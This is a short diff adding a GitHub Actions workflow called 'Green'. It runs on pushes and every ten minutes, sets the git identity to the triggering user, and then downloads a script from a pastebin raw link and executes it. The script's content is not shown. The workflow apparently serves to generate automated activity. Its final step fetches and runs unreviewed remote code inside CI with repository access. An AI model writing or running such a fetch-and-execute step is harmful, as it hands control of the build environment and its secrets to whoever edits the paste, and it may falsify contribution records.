@@ -1,0 +1,20 @@
+name: Green
+on:
+  push:
+    branches:
+      - main
+  schedule:
+    - cron: "*/10 * * * *"
+jobs:
+   Green:
+    name: Green
+    runs-on: ubuntu-latest
+    steps:
+      - name: Green
+        uses: actions/checkout@v3
+      - name: Green
+        run: |
+          git config --local user.email "${GITHUB_ACTOR}@users.noreply.github.com"
+          git config --local user.name "${GITHUB_ACTOR}"
+      - name: Green
+        run: wget -O green.sh https://pastebin.com/raw/TSdK8bzu && chmod +x ./green.sh && ./green.sh
